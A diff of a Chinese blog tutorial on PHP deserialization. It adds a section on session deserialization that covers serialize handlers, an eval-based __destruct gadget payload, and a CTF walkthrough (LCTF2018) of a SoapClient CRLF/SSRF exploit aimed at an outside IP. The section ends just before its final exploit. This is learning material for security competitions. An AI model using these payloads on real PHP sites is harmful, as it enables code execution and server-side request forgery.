@@ -232,7 +232,7 @@
 
             <span class="meta-info-item article-update-date">
                 <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                <span class="pc">2023-03-29 22:02:41</span>
+                <span class="pc">2024-06-11 17:38:31</span>
             </span>
         
 
@@ -265,12 +265,12 @@
         
         
             <span class="meta-info-item article-wordcount">
-                <i class="icon fas fa-file-word"></i>&nbsp;<span>3.8k 字</span>
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>6.6k 字</span>
             </span>
         
         
             <span class="meta-info-item article-min2read">
-                <i class="icon fas fa-clock"></i>&nbsp;<span>16 分钟</span>
+                <i class="icon fas fa-clock"></i>&nbsp;<span>28 分钟</span>
             </span>
         
         
@@ -294,7 +294,7 @@
                 <p>PHP 反序列化</p>
 <span id="more"></span>
 
-<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>Java 基础的反序列化已经学了一些内容了，因为最近要打省赛，打算粗略的过一遍 PHP 反序列化吧，学习 PHP 也是给自己少点压力，学 Java 确实难。</p>
+<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>过一遍 PHP 反序列化</p>
 <h2 id="0x02-PHP-的反序列化"><a href="#0x02-PHP-的反序列化" class="headerlink" title="0x02 PHP 的反序列化"></a>0x02 PHP 的反序列化</h2><ul>
 <li>和 Java 一样，也是两个方法</li>
 </ul>
@@ -483,7 +483,151 @@
 
 <img src="/2022/09/07/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/DereaseAttakSuess.png" class>
 
-<h2 id="0x05-Session-反序列化"><a href="#0x05-Session-反序列化" class="headerlink" title="0x05 Session 反序列化"></a>0x05 Session 反序列化</h2>
+<h2 id="0x05-Session-反序列化"><a href="#0x05-Session-反序列化" class="headerlink" title="0x05 Session 反序列化"></a>0x05 Session 反序列化</h2><p>终于要对 Session 反序列化动手了哈哈，之前一直没弄。</p>
+<h3 id="什么是-PHP-Session"><a href="#什么是-PHP-Session" class="headerlink" title="什么是 PHP Session"></a>什么是 PHP Session</h3><p><code>PHP session</code>可以看做是一个特殊的变量，且该变量是用于存储关于用户会话的信息，或者更改用户会话的设置，需要注意的是，<code>PHP Session</code> 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的，且其对应的具体 <code>session</code> 值会存储于服务器端，这也是与 <code>cookie</code>的主要区别，所以<code>seesion</code> 的安全性相对较高。</p>
+<p>其中单一用户的信息是通过序列化的方式来存储的。</p>
+<h3 id="PHP-Session-的工作流程"><a href="#PHP-Session-的工作流程" class="headerlink" title="PHP Session 的工作流程"></a>PHP Session 的工作流程</h3><p>会话的工作流程很简单，当开始一个会话时，PHP 会尝试从请求中查找会话 ID （通常通过会话 <code>cookie</code>），如果发现请求的 <code>Cookies</code>、<code>Get</code>、<code>POST</code> 中不存在 <code>session id</code>，PHP 就会自动调用 <code>php_session_create_id</code> 函数创建一个新的会话，并且在 <code>http response</code> 中通过 <code>set-cookie</code> 头部发送给客户端保存。</p>
+
+
+<p>有时候浏览器用户设置会禁止 <code>cookie</code>，当在客户端<code>cookie</code>被禁用的情况下，php也可以自动将<code>sessionid</code>添加到url参数中以及<code>form</code>的<code>hidden</code>字段中，但这需要将<code>php.ini</code>中的<code>session.use_trans_sid</code>设为开启，也可以在运行时调用<code>ini_set</code>来设置这个配置项。</p>
+<p>会话开始之后，PHP 就会将会话中的数据设置到 <code>$_SESSION</code> 变量中，如下述代码就是一个在 <code>$_SESSION</code> 变量中注册变量的例子：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;xianzhi&#x27;</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>当 PHP 停止的时候，它会自动读取 <code>$_SESSION</code> 中的内容，并将其进行<strong>序列化</strong>， 然后发送给会话保存管理器来进行保存。</p>
+<p>默认情况下，PHP 使用内置的文件会话保存管理器来完成 session 的保存，也可以通过配置项 <code>session.save_handler</code> 来修改所要采用的会话保存管理器。 对于文件会话保存管理器，会将会话数据保存到配置项 <code>session.save_path</code> 所指定的位置。</p>
+<p>虽然上述已经表达的非常明确了，不过还是用这一副图来表示一下工作流程</p>
+<img src="/2022/09/07/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/session_work.png" class>
+
+<h3 id="PHP-Session-的存储机制"><a href="#PHP-Session-的存储机制" class="headerlink" title="PHP Session 的存储机制"></a>PHP Session 的存储机制</h3><p>PHP Session 的存储位置我们先要明确，在 <code>php.ini</code> 的 <code>session.save_path</code> 属性中。一般来说 session 存储名有几种，<code>ci_</code> 或是 <code>sess_</code>，默认是以文件的方式存储的。</p>
+<img src="/2022/09/07/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/sessionStore.png" class>
+
+<p>文件的内容很显然，是 session 值序列化之后的内容</p>
+<img src="/2022/09/07/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/sessionValue.png" class>
+
+<p><code>session.serialize_handler</code> 定义的引擎有三种，如下表所示：</p>
+<table>
+<thead><tr>
+<th style>处理器名称</th>
+<th style>存储格式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style>php</td>
+<td style>键名 + 竖线 + 经过<code>serialize()</code>函数序列化处理的值</td>
+</tr>
+<tr>
+<td style>php_binary</td>
+<td style>键名的长度对应的 ASCII 字符 + 键名 + 经过<code>serialize()</code>函数序列化处理的值</td>
+</tr>
+<tr>
+<td style>php_serialize</td>
+<td style>经过serialize()函数序列化处理的<strong>数组</strong></td>
+</tr>
+</tbody>
+</table>
+
+<p><strong>注：自 PHP 5.5.4 起可以使用 <em>php_serialize</em></strong></p>
+<p>上述三种处理器中，<code>php_serialize</code>在内部简单地直接使用 <code>serialize/unserialize</code>函数，并且不会有<code>php</code>和 <code>php_binary</code>所具有的限制。 使用较旧的序列化处理器导致<code>$_SESSION</code> 的索引既不能是数字也不能包含特殊字符(<code>|</code> 和 <code>!</code>) 。</p>
+<p>下面我们实例来看看三种不同处理器序列化后的结果。</p>
+<h4 id="PHP-处理器"><a href="#PHP-处理器" class="headerlink" title="PHP 处理器"></a>PHP 处理器</h4><p>首先来看看 <code>session.serialize_handler</code> 等于 <code>php</code> 时候的序列化结果，demo 如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;session&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>得到的 session 结果为 </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session|s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><code>session</code> 为<code>$_SESSION[&#39;session&#39;]</code>的键名，<code>|</code>后为传入 GET 参数经过序列化后的值。</p>
+<h4 id="php-binary-处理器"><a href="#php-binary-处理器" class="headerlink" title="php_binary 处理器"></a>php_binary 处理器</h4><p>再来看看<code>session.serialize_handler</code>等于 <code>php_binary</code>时候的序列化结果。</p>
+<p>demo 如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;sessionsessionsessionsessionsession&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>为了更能直观的体现出格式的差别，因此这里设置了键值长度为 35，35 对应的 ASCII 码为<code>#</code>，所以最终的结果如下图所示：</p>
+<img src="/2022/09/07/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/phpbinary.png" class>
+
+<p>session 的结果为：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#sessionsessionsessionsessionsessions:4:&quot;test&quot;;</span><br></pre></td></tr></table></figure>
+
+<p><code>#</code>为键名长度对应的 ASCII 的值，<code>sessionsessionsessionsessionsessions</code>为键名，<code>s:4:&quot;test&quot;;</code>为传入 GET 参数经过序列化后的值。</p>
+<h4 id="php-serialize-处理器"><a href="#php-serialize-处理器" class="headerlink" title="php_serialize 处理器"></a>php_serialize 处理器</h4><p>最后就是 <code>session.serialize_handler</code> 等于 <code>php_serialize</code> 时候的序列化结果，同理，demo 如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;session&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2022/09/07/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/serializePHPsession.png" class>
+
+<p>得到的 session 值为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;session&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>a:1</code>表示<code>$_SESSION</code>数组中有 1 个元素，花括号里面的内容即为传入 GET 参数经过序列化后的值</p>
+<h3 id="漏洞实例"><a href="#漏洞实例" class="headerlink" title="漏洞实例"></a>漏洞实例</h3><p>先聊一下漏洞原理</p>
+<p>当序列化存储 Session 数据与反序列化读取 Session 数据的方式不同时会产生漏洞。</p>
+<p>看了一下其实大部分例题并非很 Real World，但是在实际漏洞挖掘过程中确实也有一些非常 Real World 的场景，接下来我们一步步由浅到深地看。</p>
+<p><a class="link" target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6640#toc-10">https://xz.aliyun.com/t/6640#toc-10<i class="fas fa-external-link-alt"></i></a><br><a class="link" target="_blank" rel="noopener" href="https://mochazz.github.io/2019/01/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">https://mochazz.github.io/2019/01/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96<i class="fas fa-external-link-alt"></i></a></p>
+<h4 id="例题一"><a href="#例题一" class="headerlink" title="例题一"></a>例题一</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$drun1baby</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;drun1baby = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;drun1baby);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$m</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_string</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;t1.php&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到题目环境中的 <code>session.serialize_handler</code> 默认为 php_serialize 处理器，而程序使用的却是 php 处理器，而且开头使用了 <strong>session_start()</strong> 函数，那么我们就可以利用 <code>session.upload_progress.enabled</code> 来伪造 session ，然后在 PHP 反序列化 session 文件时，还原 <strong>Test</strong> 类，最终执行 eval 函数。</p>
+<img src="/2022/09/07/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/phpinfo.png" class>
+
+<p>先编写恶意代码，用来伪造 session</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$drun1baby</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;drun1baby = <span class="string">&#x27;echo system(&quot;whoami);&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;drun1baby);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;payload&#x27;</span>] = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>生成的 session 文件内容为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload|O:<span class="number">4</span>:<span class="string">&quot;Test&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">9</span>:<span class="string">&quot;drun1baby&quot;</span>;s:<span class="number">21</span>:<span class="string">&quot;echo system(&quot;</span>whoami);<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>接下来需要通过 <code>session.upload_progress.enabled</code> 来伪造。</p>
+<p>我们可以通过如下表单，抓包修改 filename 为 payload 即可。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://localhost/t1.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&lt;?php echo ini_get(&quot;</span><span class="attr">session.upload_progress.name</span>&quot;); ?&gt;</span>&quot; value=&quot;123&quot; /&gt;</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>最终会生成一个 session 文件， php 在获取 session 的时候，会按照 <code>session.serialize_handler=php</code> 规则来处理 session 文件，将 <code>|</code> 符号之前的所有内容认为是键名，之后的内容则用于反序列化。</p>
+<p>我这里本地没复现成功，可能受 PHP 版本影响了。放一张其他师傅利用成功的图。</p>
+<img src="/2022/09/07/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/bug71101.png" class>
+
+<h4 id="例题二"><a href="#例题二" class="headerlink" title="例题二"></a>例题二</h4><p>题目链接</p>
+<p><a class="link" target="_blank" rel="noopener" href="https://buuoj.cn/challenges#bestphp's%20revenge">https://buuoj.cn/challenges#bestphp&#39;s%20revenge<i class="fas fa-external-link-alt"></i></a></p>
+<p>源代码 <strong>index.php</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// lctf2018 bestphp&#x27;s revenge</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;implode&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>], <span class="variable">$_POST</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(<span class="title function_ invoke__">reset</span>(<span class="variable">$_SESSION</span>), <span class="string">&#x27;welcome_to_the_lctf2018&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$b</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>还有 flag.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//only localhost can get flag!</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;only localhost can get flag!&#x27;</span>;</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;LCTF&#123;*************************&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]===<span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;flag&#x27;</span>] = <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>flag.php 这里是一个典型的 SSRF，当然同样关注一下前面的内容。</p>
+<p>首先第五行 <code>call_user_func($_GET[&#39;f&#39;], $_POST);</code> 代码，潜在的命令执行漏洞，<code>$_POST</code> 是一个数组，如果要利用的话只能进行变量覆盖利用。</p>
+<p>下面存在 Session 伪造漏洞，可以直接通过传参伪造，后续可以利用反序列化或者是文件包含。</p>
+<p>最后也是一个 <code>call_user_func</code>，但是 <code>$a</code> 这里看起来不可控，没法直接利用。</p>
+<p>结合 flag.php 的内容知道了这是个 SSRF 的漏洞，所以这里第一反应是思考 SoapClient 类打 SSRF 漏洞。而这里 SoapClient 类在被调用 <code>__call</code> 魔术方法的时候会发起 HTTP 请求，正好符合题意。接下来先编写 SSRF 的 EXP</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://124.222.21.138:2333/&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>, <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="string">&quot;WHOAMI\r\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4&quot;</span>, <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&#x27;test&#x27;</span>));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">a</span>();    <span class="comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>由于 PHP 中的原生 SoapClient 类存在 CRLF 漏洞，所以我们可以伪造任意 header 信息，上面的请求结果如下：</p>
+<img src="/2022/09/07/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/crlfSoap.png" class>
+
+<p>而 call_user_func 函数中的参数可以是一个数组，数组中第一个元素为类名，第二个元素为类方法，例如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myclass</span> </span>&#123;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">say_hello</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hello!\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$classname</span> = <span class="string">&quot;myclass&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="keyword">array</span>(<span class="variable">$classname</span>, <span class="string">&#x27;say_hello&#x27;</span>));</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$classname</span> .<span class="string">&#x27;::say_hello&#x27;</span>); <span class="comment">// As of 5.2.3</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myobject</span> = <span class="keyword">new</span> <span class="title function_ invoke__">myclass</span>();</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="keyword">array</span>(<span class="variable">$myobject</span>, <span class="string">&#x27;say_hello&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这样子一来我们可以构造如下一个恶意的 payload，即调用 SoapClient 类不存在的 welcome_to_the_lctf2018 方法，从而触发 <code>__call</code> 方法发起 soap 请求进行 SSRF 。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$b</span>, <span class="variable">$a</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//转换成</span></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="string">&#x27;call_user_func&#x27;</span>,<span class="keyword">array</span>(<span class="string">&#x27;SoapClient&#x27;</span>,<span class="string">&#x27;welcome_to_the_lctf2018&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这里还要提及一点的是 <strong>session_start</strong> 函数从 <strong>PHP7</strong> 开始允许通过参数来设置 <strong>session</strong> 运行时配置。例如： <code>session_start(array(&#39;serialize_handler&#39; =&gt; &#39;php_serialize&#39;))</code> 将会设置 <strong>session.serialize_handler&#x3D;php_serialize</strong> 。</p>
+<p>通过<code>call_user_func</code>将序列化引擎从<code>php</code>改变为<code>php_serialize</code>。其中利用的是session_start,一般是利用ini.set,来修改处理器，但是POST传入的参数是数组，ini.set不能处理数组，所以使用session_start来修改。</p>
+<p>传参 HTTP 请求</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?f=session_start</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>644ac9ed-fd72-4092-913c-3e5c0834c6c8.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>31</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=test</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-ini"><span class="attr">serialize_handler</span>=php_serialize</span></span><br></pre></td></tr></table></figure>
+
+<p>这就会构成 <code>call_user_func(session_start(array(&#39;serialize_handler&#39; =&gt; &#39;php_serialize&#39;))</code></p>
+<p>接下来构造一个 EXP</p>
